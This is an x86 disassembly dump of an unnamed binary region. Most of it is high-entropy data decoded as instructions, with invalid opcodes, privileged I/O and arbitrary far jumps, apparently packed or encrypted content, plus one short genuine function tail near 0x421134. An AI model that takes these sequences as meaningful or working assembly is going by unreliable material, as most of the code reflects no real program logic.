  42107c:	fstp   DWORD PTR [edx+0x65ba16a3]
  421082:	cmp    ecx,DWORD PTR [edx]
  421084:	xor    BYTE PTR [esi+0xa],dl
  421087:	fnstcw WORD PTR [ebx+0xb9ff6a9]
  42108d:	add    DWORD PTR [eax-0x459181b8],esi
  421093:	sub    ecx,esp
  421095:	mov    ah,0xf9
  421097:	in     al,dx
  421098:	jp     0x42102b
  42109a:	jge    0x4210af
  42109c:	(bad)  
  42109d:	mov    cl,0x50
  42109f:	add    BYTE PTR [esi+0x6],dl
  4210a2:	push   cs
  4210a3:	jle    0x421033
  4210a5:	dec    esp
  4210a6:	ins    BYTE PTR es:[edi],dx
  4210a7:	loop   0x42102b
  4210a9:	pop    edi
  4210aa:	lods   al,BYTE PTR ds:[esi]
  4210ab:	fdiv   DWORD PTR [eax]
  4210ad:	sahf   
  4210ae:	sbb    DWORD PTR [esi-0x7b],esi
  4210b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210b2:	pusha  
  4210b3:	jb     0x4210d0
  4210b5:	push   0xde30bd31
  4210ba:	xchg   edi,eax
  4210bb:	push   eax
  4210bc:	jl     0x421111
  4210be:	imul   esi,DWORD PTR [esi],0x65
  4210c1:	push   ss
  4210c2:	retf   
  4210c3:	scas   eax,DWORD PTR es:[edi]
  4210c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210c5:	sha256msg2 xmm2,XMMWORD PTR ds:0xa28c1e8f
  4210cd:	shl    DWORD PTR [edi-0x40],cl
  4210d0:	pop    esp
  4210d1:	and    eax,0x83ad3cac
  4210d6:	xor    bh,BYTE PTR [edx+0x5c]
  4210d9:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4210db:	push   ss
  4210dc:	bound  esp,QWORD PTR [ecx-0x75]
  4210df:	ja     0x4210f2
  4210e1:	addr16 sbb al,al
  4210e4:	mov    DWORD PTR ds:0x7f221bd,edi
  4210ea:	push   edx
  4210eb:	cmp    edi,DWORD PTR [eax-0x4b]
  4210ee:	outs   dx,DWORD PTR ds:[esi]
  4210ef:	xchg   esi,eax
  4210f0:	pop    ecx
  4210f1:	pushf  
  4210f2:	xchg   esi,eax
  4210f3:	pop    ecx
  4210f4:	mov    ds:0xff42277f,eax
  4210f9:	(bad)  [edi]
  4210fb:	sub    BYTE PTR [edi-0x3eba2712],0xdf
  421102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421103:	fistp  QWORD PTR [ebx+edx*2]
  421106:	mov    esp,0x5a35d2
  42110b:	lock xor ebp,DWORD PTR [eax]
  42110e:	aas    
  42110f:	ss in  eax,0xe9
  421112:	rol    BYTE PTR [eax],1
  421114:	ret    0xfd7b
  421117:	test   BYTE PTR [edi-0xa],bl
  42111a:	jae    0x4210b4
  42111c:	xlat   BYTE PTR ds:[ebx]
  42111d:	lods   al,BYTE PTR ds:[esi]
  42111e:	imul   ebx,DWORD PTR [eax+0x1dfe2a66],0x35
  421125:	test   al,0x69
  421127:	inc    edx
  421128:	lds    esp,FWORD PTR [ebx]
  42112a:	dec    edx
  42112b:	cmp    edi,edi
  42112d:	xchg   esp,eax
  42112e:	cs adc bh,dh
  421131:	ficomp WORD PTR [ebx]
  421133:	icebp  
  421134:	mov    edi,DWORD PTR [ecx]
  421136:	add    edx,edi
  421138:	mov    DWORD PTR [ecx],edx
  42113a:	mov    ecx,DWORD PTR [ebp+0x8]
  42113d:	xor    ecx,eax
  42113f:	add    ecx,esi
  421141:	jne    0x41ed92
  421147:	mov    ecx,DWORD PTR [ebp-0x8]
  42114a:	xor    ecx,eax
  42114c:	mov    eax,DWORD PTR [ebp+0x10]
  42114f:	add    ecx,esi
  421151:	mov    DWORD PTR [eax],ecx
  421153:	pop    edi
  421154:	pop    esi
  421155:	pop    ebx
  421156:	leave  
  421157:	ret    0xc
  42115a:	pop    ss
  42115b:	or     al,0x84
  42115d:	repz lahf 
  42115f:	sti    
  421160:	ja     0x42114e
  421162:	stos   BYTE PTR es:[edi],al
  421163:	mov    edx,0xfd3388e2
  421168:	pushf  
  421169:	pop    eax
  42116a:	cmp    eax,0x610001cc
  42116f:	add    BYTE PTR [eax],al
  421171:	add    BYTE PTR [ebp-0x52ef8cdb],al
  421177:	pop    ecx
  421178:	aad    0xd4
  42117a:	mov    ecx,0xa5102df
  42117f:	in     eax,dx
  421180:	jns    0x42113a
  421182:	imul   ebx,DWORD PTR [ecx],0x57
  421185:	inc    ecx
  421186:	retf   0x499d
  421189:	xchg   DWORD PTR [esi],ebp
  42118b:	ret    0x106b
  42118e:	sub    BYTE PTR [ecx-0x635eeacb],0x53
  421195:	add    DWORD PTR [esi+eiz*4+0xa],ebp
  421199:	lea    edi,[ecx]
  42119b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42119c:	mov    bh,0xb7
  42119e:	loopne 0x42121e
  4211a0:	xchg   DWORD PTR ds:0xbeb0e7de,ecx
  4211a6:	imul   esp,DWORD PTR [esi+0xb],0xffffff83
  4211aa:	dec    esi
  4211ab:	test   al,0xc7
  4211ad:	out    dx,eax
  4211ae:	mov    dl,0xbe
  4211b0:	out    dx,al
  4211b1:	cmp    ebx,esi
  4211b3:	or     DWORD PTR [ecx-0x8],ecx
  4211b6:	pop    ds
  4211b7:	cs xchg esi,eax
  4211b9:	fwait
  4211ba:	in     al,0x56
  4211bc:	(bad)  [edx-0x46]
  4211bf:	dec    esi
  4211c0:	cwde   
  4211c1:	aad    0x6a
  4211c3:	dec    esp
  4211c4:	mov    WORD PTR ds:0x67ff947c,?
  4211ca:	dec    ebp
  4211cb:	add    BYTE PTR [ebx+ebp*8+0x277d4645],0xe0
  4211d3:	add    BYTE PTR [eax],al
  4211d5:	add    BYTE PTR [eax],al
  4211d7:	add    BYTE PTR [eax],al
  4211d9:	add    cl,dl
  4211db:	sub    al,0x14
  4211dd:	adc    edi,ebp
  4211df:	cmp    edx,edi
  4211e1:	out    dx,al
  4211e2:	pop    edi
  4211e3:	xchg   bx,ax
  4211e5:	push   0x142c0364
  4211ea:	sahf   
  4211eb:	int3   
  4211ec:	add    DWORD PTR [eax],eax
  4211ee:	popa   
  4211ef:	add    BYTE PTR [eax],al
  4211f1:	add    BYTE PTR [ebx+0x42da1810],al
  4211f7:	dec    eax
  4211f8:	xor    ah,al
  4211fa:	gs ins DWORD PTR es:[edi],dx
  4211fc:	aam    0xf4
  4211fe:	mov    edx,0xbe99be3c
  421203:	jp     0x421226
  421205:	dec    edx
  421206:	inc    esp
  421207:	cwde   
  421208:	mov    ds:0x158809e5,al
  42120d:	imul   edx,DWORD PTR [edi-0x7f813d3],0xf8b2d70b
  421217:	test   al,0x5
  421219:	mov    cl,0x1f
  42121b:	bound  esp,QWORD PTR [edx-0x29]
  42121e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42121f:	xchg   DWORD PTR [edi-0x723fbc8],edi
  421225:	push   0x699f1991
  42122a:	xlat   BYTE PTR ds:[ebx]
  42122b:	and    bh,BYTE PTR [ebx+edx*4]
  42122e:	call   0x76be:0xdb8f59ff
  421235:	mov    ch,0x6d
  421237:	dec    edi
  421238:	or     eax,ecx
  42123a:	aaa    
  42123b:	push   esi
  42123c:	sete   bh
  42123f:	push   DWORD PTR [ebx-0x49]
  421242:	xchg   edx,eax
  421243:	out    dx,eax
  421244:	sub    dh,BYTE PTR [eax-0x18]
  421247:	clc    
  421248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421249:	jle    0x421281
  42124b:	dec    eax
  42124c:	mov    cl,0xd0
  42124e:	fiadd  DWORD PTR [esi+ebp*1]
  421251:	push   0x57
  421256:	add    BYTE PTR [eax],al
  421258:	add    BYTE PTR [eax],al
  42125a:	pop    ds
  42125b:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421261:	sub    eax,esi
  421263:	add    BYTE PTR [edi+eax*2-0x45f6287f],0xff
  42126b:	int3   
  42126c:	add    DWORD PTR [eax],eax
  42126e:	popa   
  42126f:	add    BYTE PTR [eax],al
  421271:	add    BYTE PTR [ecx+0x40034e97],bh
  421277:	daa    
  421278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421279:	loopne 0x421222
  42127b:	(bad)  
  42127c:	aaa    
  42127d:	pop    ecx
  42127e:	jecxz  0x42126f
  421280:	mov    DWORD PTR [edx-0x6],esi
  421283:	xor    BYTE PTR [esi+ebx*1],dl
  421286:	mov    edi,0x8154cdd1
  42128b:	and    dl,al
  42128d:	in     al,0x4e
  42128f:	iret   
  421290:	and    al,BYTE PTR [esi]
  421292:	fcom   QWORD PTR [edi+0x17]
  421295:	add    BYTE PTR [esi-0x3f],dl
  421298:	out    0xec,eax
  42129a:	or     al,0x31
  42129c:	mov    ebx,0x6f964526
  4212a1:	stos   DWORD PTR es:[edi],eax
  4212a2:	js     0x4212cd
  4212a4:	ds loop 0x4212ce
  4212a7:	sub    bh,ch
  4212a9:	inc    esi
  4212aa:	pop    edx
  4212ab:	out    0x77,al
  4212ad:	jle    0x421326
  4212af:	push   eax
  4212b0:	bound  ebx,QWORD PTR [edx+0x40]
  4212b3:	add    dl,BYTE PTR [ecx+0x5d]
  4212b6:	cld    
  4212b7:	dec    ebp
  4212b8:	loop   0x4212b5
  4212ba:	cld    
  4212bb:	in     eax,dx
  4212bc:	push   0xffffffe4
  4212be:	fs mov ch,0x63
  4212c1:	push   es
  4212c2:	jg     0x421275
  4212c4:	inc    ebx
  4212c5:	cld    
  4212c6:	sti    
  4212c7:	(bad)  
  4212c8:	cmc    
  4212c9:	or     edi,DWORD PTR [esi+0x24]
  4212cc:	retf   
  4212cd:	mov    esi,?
  4212cf:	mov    dl,0x12
  4212d1:	sbb    al,0xae
  4212d3:	add    BYTE PTR [eax],al
  4212d5:	add    BYTE PTR [eax],al
  4212d7:	add    BYTE PTR [eax],al
  4212d9:	add    BYTE PTR [edi],ch
  4212db:	and    al,0xf0
  4212dd:	aam    0xfb
  4212df:	aam    0x2f
  4212e1:	jmp    FWORD PTR [esi+0x33]
  4212e4:	je     0x42129c
  4212e6:	out    dx,al
  4212e7:	idiv   BYTE PTR [edx*1+0x1cd60]
  4212ee:	popa   
  4212ef:	add    BYTE PTR [eax],al
  4212f1:	add    bh,ch
  4212f3:	xor    al,BYTE PTR [ecx+0x591cb1ec]
  4212f9:	call   0xe5a1:0x4cecb3e3
  421300:	sbb    BYTE PTR [edx+0x2eb5164d],ah
  421306:	push   ebp
  421307:	or     eax,0x5b3a1f1d
  42130c:	add    eax,0x99bcb525
  421311:	fisttp DWORD PTR [edx+0x7221d00c]
  421317:	mov    ch,0x33
  421319:	mov    dl,0x32
  42131b:	test   DWORD PTR [ecx+0x3ce3cfbe],ebp
  421321:	jg     0x42139e
  421323:	xchg   esi,eax
  421324:	xchg   ebx,eax
  421325:	imul   edx,edi,0x6882f4f9
  42132b:	push   esp
  42132c:	xor    edx,esp
  42132e:	cs push ss
  421330:	stos   DWORD PTR es:[edi],eax
  421331:	bound  edi,QWORD PTR [edi+0x53e62865]
  421337:	inc    eax
  421338:	inc    edi
  421339:	push   edi
  42133a:	mov    ch,0xe
  42133c:	icebp  
  42133d:	and    edi,DWORD PTR [ecx+edx*4-0x568e057d]
  421344:	shl    BYTE PTR [ecx-0x54148d86],0x80
  42134b:	or     eax,0xd4ca78e0
  421350:	dec    edi
  421351:	lahf   
  421352:	pushf  
  421353:	add    BYTE PTR [eax],al
  421355:	add    BYTE PTR [eax],al
  421357:	add    BYTE PTR [eax],al
  421359:	add    dl,cl
  42135b:	mov    al,ds:0xdf7e4d76
  421360:	sti    
  421361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421362:	mov    bh,0x83
  421364:	dec    edi
  421365:	mov    ds:0x9a116e1e,al
  42136a:	ror    ebp,0x1
  42136d:	add    BYTE PTR [ecx+0x0],ah
  421370:	add    BYTE PTR [eax],al
  421372:	push   edx
  421373:	pop    es
  421374:	jmp    0xc8f63503
  421379:	adc    al,BYTE PTR [ebp+0x28ea541f]
  42137f:	xchg   ebx,eax
  421380:	mov    ebp,0xe2998745
  421385:	pop    ebp
  421386:	jno    0x4213db
  421388:	add    dl,BYTE PTR [esi+eax*8-0x70]
  42138c:	mov    esi,fs
  42138e:	popa   
  42138f:	cmp    al,0x3d
  421391:	daa    
  421392:	out    0x25,al
  421394:	jnp    0x42133c
  421396:	inc    esp
  421397:	test   ebp,ecx
  421399:	pop    eax
  42139a:	leave  
  42139b:	pop    ss
  42139c:	mov    WORD PTR [ebx-0x26573e2b],?
  4213a2:	inc    ecx
  4213a3:	fldcw  WORD PTR [ebp-0x3a]
  4213a6:	(bad)  
  4213a7:	push   ebx
  4213a8:	jbe    0x4213e9
  4213aa:	jp     0x4213a2
  4213ac:	jnp    0x42137e
  4213ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213af:	push   ss
  4213b0:	jl     0x4213f6
  4213b2:	dec    edx
  4213b3:	mov    eax,0x82a49ceb
  4213b8:	inc    esi
  4213b9:	dec    ebp
  4213ba:	test   eax,0xd785fa46
  4213bf:	mov    esp,0x5e905f7a
  4213c4:	pop    ebp
  4213c5:	test   BYTE PTR [ecx-0x3d],dl
  4213c8:	sub    eax,0x1fd88e81
  4213cd:	(bad)  
  4213ce:	popa   
  4213cf:	pop    ds
  4213d0:	pop    es
  4213d1:	pop    es
  4213d2:	fld    QWORD PTR [eax]
  4213d4:	add    BYTE PTR [eax],al
  4213d6:	add    BYTE PTR [eax],al
  4213d8:	add    BYTE PTR [eax],al
  4213da:	(bad)  
  4213db:	out    dx,al
  4213dc:	lods   al,BYTE PTR ds:[esi]
  4213dd:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4213e4:	stc    
  4213e5:	stc    
  4213e6:	icebp  
  4213e7:	inc    ecx
  4213e8:	push   eax
  4213e9:	fldenv [edx]
  4213eb:	into   
  4213ec:	add    DWORD PTR [eax],eax
  4213ee:	popa   
  4213ef:	add    BYTE PTR [eax],al
  4213f1:	add    ah,dh
  4213f3:	in     eax,dx
  4213f4:	daa    
  4213f5:	std    
  4213f6:	and    bh,BYTE PTR [ecx]
  4213f8:	xchg   BYTE PTR [ebp-0x304233f5],ah
  4213fe:	lock test eax,0xa9ce221c
  421404:	dec    edi
  421405:	xor    eax,0xe0d5a804
  42140a:	pop    esp
  42140b:	add    BYTE PTR [eax],ch
  42140d:	xor    DWORD PTR [eax-0x63],esp
  421410:	ja     0x4213b1
  421412:	add    al,0x1b
  421414:	aas    
  421415:	inc    edx
  421416:	or     ah,BYTE PTR [ebx+ecx*8-0x28]
  42141a:	adc    BYTE PTR [ebx-0x7a],ch
  42141d:	pop    ebx
  42141e:	xor    al,0x69
  421420:	mov    al,0x6d
  421422:	jge    0x421438
  421424:	xchg   ax,ax
  421426:	lock sahf 
  421428:	(bad)  
  421429:	jmp    0x421473
  42142b:	iret   
  42142c:	fild   WORD PTR [esi]
  42142e:	cmp    ah,BYTE PTR [edi-0x1dfd7ddc]
  421434:	mov    edi,DWORD PTR [esi]
  421436:	sti    
  421437:	dec    eax
  421438:	cmp    esi,DWORD PTR [eax-0x3]
  42143b:	int    0x5c
  42143d:	in     eax,dx
  42143e:	jbe    0x4214a4
  421440:	loop   0x4213f2
  421442:	push   edi
  421443:	add    edi,DWORD PTR [edi]
  421445:	sahf   
  421446:	mov    edx,0xfeb458d6
  42144b:	retf   0x2163
  42144e:	idiv   DWORD PTR [esi+0xbe00d1]
  421454:	add    BYTE PTR [eax],al
  421456:	add    BYTE PTR [eax],al
  421458:	add    BYTE PTR [eax],al
  42145a:	push   edx
  42145b:	xor    al,0x40
  42145d:	gs data16 jne 0x4214d8
  421461:	aaa    
  421462:	push   0xeb6a4e09
  421467:	or     al,BYTE PTR [esi-0x72]
  42146a:	or     esi,0x1
  42146d:	add    BYTE PTR [ecx+0x0],ah
  421470:	add    BYTE PTR [eax],al
  421472:	cmp    BYTE PTR [ebx+ebp*8],ah
  421475:	leave  
  421476:	iret   
  421477:	cmc    
  421478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421479:	pop    esp
  42147a:	add    ch,BYTE PTR ds:0x829e48c7
  421480:	pusha  
  421481:	jl     0x42140e
  421483:	repz push esi
  421485:	fldenv [edi-0x35]
  421488:	add    ah,BYTE PTR [eax]
  42148a:	pop    esp
  42148b:	dec    edi
  42148c:	in     al,0xb4
  42148e:	outs   dx,DWORD PTR ds:[esi]
  42148f:	and    DWORD PTR ss:[eax-0x5232f2a7],ecx
  421496:	scas   al,BYTE PTR es:[edi]
  421497:	les    ecx,FWORD PTR [ebx+0x2b]
  42149a:	mov    ah,0x40
  42149c:	dec    eax
  42149d:	fistp  WORD PTR [edx+0x5b4db371]
  4214a3:	mov    ebp,0x6e67fcc8
  4214a8:	xor    DWORD PTR [eax+0x4a],ebx
  4214ab:	sub    al,0xba
  4214ad:	popf   
  4214ae:	mov    dl,0x77
  4214b0:	fimul  DWORD PTR [edx-0x3e]
  4214b3:	xchg   esp,edi
  4214b5:	daa    
  4214b6:	mov    cl,0x6c
  4214b8:	pop    ebx
  4214b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214ba:	sbb    edx,ebx
  4214bc:	das    
  4214bd:	bound  ebx,QWORD PTR [ebp+0x7e8bc7f8]
  4214c3:	into   
  4214c4:	icebp  
  4214c5:	mov    ds:0x9ec73f8e,eax
  4214ca:	std    
  4214cb:	clc    
  4214cc:	mov    edx,es
  4214ce:	jns    0x42148d
  4214d0:	in     al,dx
  4214d1:	shl    DWORD PTR [edx],0x0
  4214d4:	add    BYTE PTR [eax],al
  4214d6:	add    BYTE PTR [eax],al
  4214d8:	add    BYTE PTR [eax],al
  4214da:	adc    bh,BYTE PTR [edx-0x19073928]
  4214e0:	push   ds
  4214e1:	(bad)  
  4214e2:	adc    bl,dh
  4214e4:	cwde   
  4214e5:	out    dx,al
  4214e6:	repz neg BYTE PTR [ebp-0x33]
  4214ea:	adc    al,0xe1
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	popa   
  4214ef:	add    BYTE PTR [eax],al
  4214f1:	add    BYTE PTR [ecx+0x7],dl
  4214f4:	add    ah,BYTE PTR [edx+esi*2+0x15]
  4214f8:	xchg   edi,eax
  4214f9:	ret    
  4214fa:	out    dx,eax
  4214fb:	imul   DWORD PTR [eax]
  4214fd:	push   ecx
  4214fe:	mov    bh,0x3b
  421500:	out    0x8f,eax
  421502:	bound  ebx,QWORD PTR [ecx+0x2e]
  421505:	retf   0x7358
  421508:	int3   
  421509:	jp     0x421499
  42150b:	js     0x421587
  42150d:	push   0xffffff84
  42150f:	fistp  WORD PTR [ebx]
  421511:	ficom  DWORD PTR ds:[edi]
  421514:	inc    ecx
  421515:	adc    BYTE PTR [eax-0x68],ah
  421518:	sahf   
  421519:	add    al,ah
  42151b:	xchg   ebp,eax
  42151c:	ffreep st(2)
  42151e:	mov    ds:0x8a631142,al
  421523:	sti    
  421524:	sar    esi,cl
  421526:	dec    esp
  421527:	dec    ebp
  421528:	push   esi
  421529:	xor    al,0xb6
  42152b:	ss retf 
  42152d:	les    ebp,FWORD PTR [ebp-0x58]
  421530:	pop    esp
  421531:	jno    0x4215a6
  421533:	or     eax,0x2e88dc04
  421538:	cmp    eax,0xb80475ef
  42153d:	cwde   
  42153e:	mov    al,BYTE PTR [esp+esi*2+0x3798838a]
  421545:	cwde   
  421546:	mov    al,ds:0xfccdd9ec
  42154b:	imul   esp
  42154d:	jp     0x42152b
  42154f:	out    0x43,eax
  421551:	xchg   edi,eax
  421552:	mov    al,ds:0x0
  421557:	add    BYTE PTR [eax],al
  421559:	add    BYTE PTR [ecx+0x46],cl
  42155c:	sub    BYTE PTR [eax],dh
  42155e:	das    
  42155f:	jle    0x4215ba
  421561:	jg     0x421529
  421563:	imul   esi,eax,0xffffffd5
  421566:	outs   dx,BYTE PTR ds:[esi]
  421567:	call   0xe1b76c23
  42156c:	add    DWORD PTR [eax],eax
  42156e:	popa   
  42156f:	add    BYTE PTR [eax],al
  421571:	add    BYTE PTR [eax],bh
  421573:	fwait
  421574:	out    0x54,al
  421576:	xchg   ebp,eax
  421577:	pushf  
  421578:	mov    esi,0xd419c415
  42157d:	cwde   
  42157e:	pushf  
  42157f:	and    ch,BYTE PTR [edi-0x72]
  421582:	sub    bh,dl
  421584:	push   esi
  421585:	stos   BYTE PTR es:[edi],al
  421586:	dec    ebp
  421587:	(bad)  
  421588:	les    esi,FWORD PTR [ecx-0x9e8a1b9]
  42158e:	pop    edx
  42158f:	imul   edi,DWORD PTR [esi],0xab60950
  421595:	push   0x66
  421597:	(bad)  
  421598:	out    dx,al
  421599:	clc    
  42159a:	sti    
  42159b:	into   
  42159c:	mov    eax,ds:0xcbd7b4fe
  4215a1:	jmp    0x421587
  4215a3:	loop   0x421538
  4215a5:	lods   al,BYTE PTR ds:[esi]
  4215a6:	mov    esi,0x77498684
  4215ab:	hlt    
  4215ac:	sahf   
  4215ad:	out    0xc2,eax
  4215af:	idiv   ebp
  4215b1:	jns    0x421553
  4215b3:	mov    dl,0xb0
  4215b5:	je     0x4215f4
  4215b7:	(bad)  [ebp+0x67]
  4215ba:	sbb    al,0xf
  4215bc:	mov    al,bh
  4215be:	in     eax,0x7
  4215c0:	xlat   BYTE PTR ds:[ebx]
  4215c1:	mov    dh,0xcd
  4215c3:	add    eax,0xf80ac486
  4215c8:	xchg   edx,eax
  4215c9:	call   0x30a2d6a7
  4215ce:	mov    ebp,0x4df0cd2
  4215d3:	add    BYTE PTR [eax],al
  4215d5:	add    BYTE PTR [eax],al
  4215d7:	add    BYTE PTR [eax],al
  4215d9:	add    BYTE PTR [edi-0x3a],ah
  4215dc:	and    dh,dh
  4215de:	mov    eax,ds:0xe7d7f7f6
  4215e3:	mov    eax,0xdb12da72
  4215e8:	lock jno 0x4215c1
  4215eb:	loope  0x4215ee
  4215ed:	add    BYTE PTR [ecx+0x0],ah
  4215f0:	add    BYTE PTR [eax],al
  4215f2:	pop    ebp
  4215f3:	inc    ebx
  4215f4:	inc    esp
  4215f5:	out    dx,eax
  4215f6:	jmp    0xea9a9b6d
  4215fb:	pop    ebp
  4215fc:	stc    
  4215fd:	add    al,0xf2
  4215ff:	xchg   edi,eax
  421600:	cdq    
  421601:	xchg   ebp,eax
  421602:	sub    edi,DWORD PTR [ebp-0x73]
  421605:	dec    ebp
  421606:	pop    ebp
  421607:	popa   
  421608:	add    eax,0x5faf70c4
  42160d:	mov    ds:0x363a8c21,al
  421612:	repnz mov edx,0x6375123d
  421618:	adc    eax,0xfce73404
  42161d:	fcomi  st,st(5)
  42161f:	jecxz  0x4215a1
  421621:	dec    esi
  421622:	retf   0x890c
  421625:	jecxz  0x421680
  421627:	adc    al,bl
  421629:	mov    dh,0x47
  42162b:	(bad)  
  42162c:	scas   eax,DWORD PTR es:[edi]
  42162d:	(bad)  
  42162e:	and    cl,BYTE PTR [edi+eax*2+0x58]
  421632:	retf   
  421633:	in     al,dx
  421634:	and    eax,0x9f76b81f
  421639:	inc    edx
  42163a:	ins    BYTE PTR es:[edi],dx
  42163b:	cmp    BYTE PTR gs:[edx+0x2ad55750],bh
  421642:	add    DWORD PTR ds:0x3c91bcea,0x17
  421649:	mov    ds:0xdc942eff,eax
  42164e:	add    ebp,ebx
  421650:	sbb    dl,BYTE PTR [esi+0xd0]
  421656:	add    BYTE PTR [eax],al
  421658:	add    BYTE PTR [eax],al
  42165a:	ret    
  42165b:	or     eax,0xefee66a6
  421660:	ret    
  421661:	lods   eax,DWORD PTR ds:[esi]
  421662:	sub    al,0xb8
  421664:	mov    ds:0xcb73a147,eax
  421669:	dec    ebp
  42166a:	aaa    
  42166b:	loop   0x42166e
  42166d:	add    BYTE PTR [ecx+0x0],ah
  421670:	add    BYTE PTR [eax],al
  421672:	shr    eax,1
  421674:	push   es
  421675:	sbb    bh,cl
  421677:	in     al,dx
  421678:	or     al,ah
  42167a:	and    DWORD PTR [edi+0x5114683c],ecx
  421680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421681:	mov    dl,ch
  421683:	xchg   ecx,esi
  421685:	push   eax
  421686:	js     0x421683
  421688:	out    0xeb,al
  42168a:	jge    0x4216d6
  42168c:	add    ebp,DWORD PTR [esi-0x6e]
  42168f:	or     esp,eax
  421691:	imul   esi,DWORD PTR [edi],0x2f
  421694:	mov    bl,0xca
  421696:	call   0x8c4b6324
  42169b:	or     esi,esi
  42169d:	push   esp
  42169e:	or     dl,dl
  4216a0:	push   ebx
  4216a1:	or     al,0xf7
  4216a3:	fldenv [eax+0x4714fcc]
  4216a9:	xchg   ebp,eax
  4216aa:	jae    0x4216f2
  4216ac:	out    dx,eax
  4216ad:	dec    ebx
  4216ae:	add    bh,BYTE PTR [ecx]
  4216b0:	adc    DWORD PTR [esi-0x64],ebx
  4216b3:	add    edi,edx
  4216b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216b6:	xchg   ecx,eax
  4216b7:	mov    al,ds:0x7938f039
  4216bc:	cmp    DWORD PTR [edx+0x2e],edi
  4216bf:	in     eax,0x55
  4216c1:	mov    ds:0x8db4d77,eax
  4216c6:	inc    esp
  4216c7:	sub    eax,0x879b6132
  4216cc:	inc    ebp
  4216cd:	into   
  4216ce:	push   edi
  4216cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216d0:	and    al,0x21
  4216d2:	call   0x0:0x0
  4216d9:	add    cl,bl
  4216db:	ret    0x4905
  4216de:	pop    ds
  4216df:	iret   
  4216e0:	fst    st(2)
  4216e2:	enter  0xf86f,0xd2
  4216e6:	dec    esp
  4216e7:	sub    DWORD PTR [ebx+0x1e2986d],edx
  4216ed:	add    BYTE PTR [edx+0x0],bl
  4216f0:	add    BYTE PTR [eax],al
  4216f2:	push   edx
  4216f3:	in     al,0x0
  4216f5:	jp     0x42167c
  4216f7:	jne    0x42167f
  4216f9:	push   eax
  4216fa:	mov    eax,ds:0xdd5fb8ed
  4216ff:	mov    gs,WORD PTR [esi+0x35]
  421702:	push   ss
  421703:	icebp  
  421704:	cmp    bl,BYTE PTR [ebx+0x4]
  421707:	mov    bl,0x9a
  421709:	add    DWORD PTR [ebp+ecx*2+0x509bb9f0],0xf6932cb4
  421714:	jmp    0x171e:0x674c97dc
  42171b:	idiv   DWORD PTR ds:0x4768c209
  421721:	sar    BYTE PTR [ecx],0x0
  421724:	add    ebx,DWORD PTR [edi+0x8]
  421727:	inc    eax
  421728:	je     0x421798
  42172a:	enter  0xc74b,0x5c
  42172e:	je     0x421756
  421730:	inc    edx
  421731:	cmp    eax,0xb57a6c69
  421736:	stos   BYTE PTR es:[edi],al
  421737:	jns    0x42170d
  421739:	popa   
  42173a:	fnstenv [esi+ebx*2-0x5de64c25]
  421741:	addr16 dec edi
  421743:	ins    BYTE PTR es:[edi],dx
  421744:	nop
  421745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421746:	in     al,dx
  421747:	repz cmp cl,BYTE PTR [edx+0x7d]
  42174b:	adc    al,BYTE PTR [eax]
	...
  421759:	add    BYTE PTR [eax],al
  42175b:	nop
  42175c:	inc    edx
  42175d:	add    BYTE PTR [eax+edx*4],al
  421760:	inc    edx
  421761:	add    BYTE PTR [eax],cl
  421763:	nop
  421764:	inc    edx
  421765:	add    BYTE PTR [eax+edx*4],cl
  421768:	inc    edx
  421769:	add    BYTE PTR [eax],dl
  42176b:	nop
  42176c:	inc    edx
  42176d:	add    BYTE PTR [eax+edx*4],dl
  421770:	inc    edx
  421771:	add    BYTE PTR [eax],bl
  421773:	nop
  421774:	inc    edx
  421775:	add    BYTE PTR [eax+edx*4],bl
  421778:	inc    edx
  421779:	add    BYTE PTR [eax],al
  42177b:	mov    al,ds:0xa0040042
  421780:	inc    edx
  421781:	add    BYTE PTR [eax],cl
  421783:	mov    al,ds:0xa00c0042
  421788:	inc    edx
  421789:	add    BYTE PTR [eax],dl
  42178b:	mov    al,ds:0xa0140042
  421790:	inc    edx
  421791:	add    BYTE PTR [eax],bl
  421793:	mov    al,ds:0xa01c0042
  421798:	inc    edx
  421799:	add    BYTE PTR [eax],al
  42179b:	mov    al,0x42
  42179d:	add    BYTE PTR [eax+esi*4],al
  4217a0:	inc    edx
  4217a1:	add    BYTE PTR [eax],cl
  4217a3:	mov    al,0x42
  4217a5:	add    BYTE PTR [eax+esi*4],cl
  4217a8:	inc    edx
  4217a9:	add    BYTE PTR [eax],dl
  4217ab:	mov    al,0x42
  4217ad:	add    BYTE PTR [eax+esi*4],dl
  4217b0:	inc    edx
  4217b1:	add    BYTE PTR [eax],bl
  4217b3:	mov    al,0x42
  4217b5:	add    BYTE PTR [eax+esi*4],bl
  4217b8:	inc    edx
  4217b9:	add    BYTE PTR [eax+0x66],bh
  4217bc:	ins    BYTE PTR es:[edi],dx
  4217bd:	jp     0x421816
  4217bf:	jbe    0x421808
  4217c1:	ja     0x421806
  4217c3:	js     0x42180d
  4217c5:	jno    0x42182a
  4217c7:	inc    edx
  4217c8:	inc    bx
  4217ca:	push   ebp
  4217cb:	jno    0x421843
  4217cd:	ja     0x421836
  4217cf:	dec    edi
  4217d0:	dec    esp
  4217d1:	dec    ebp
  4217d2:	inc    edx
  4217d3:	jno    0x421846
  4217d5:	jae    0x42182a
  4217d7:	push   eax
  4217d8:	arpl   WORD PTR [ebx-0x7e],dx
  4217db:	sbb    eax,DWORD PTR [edx+0x0]
  4217de:	mov    bl,BYTE PTR [ebx]
  4217e0:	inc    edx
  4217e1:	add    BYTE PTR [edx],ah
  4217e3:	sbb    al,BYTE PTR [edx+0x0]
  4217e6:	out    dx,eax
